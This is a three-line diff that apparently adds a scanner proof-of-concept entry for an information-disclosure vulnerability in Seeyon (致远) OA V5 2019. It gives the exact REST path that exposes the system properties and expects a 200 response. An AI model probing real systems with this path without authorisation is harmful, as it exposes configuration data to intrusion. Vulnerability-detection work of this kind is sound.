@@ -1,0 +1,3 @@
+name: "致远OAV52019系统properties信息泄露漏洞"
+poc: "/seeyon/rest/m3/common/system/properties"
+status_code: 200
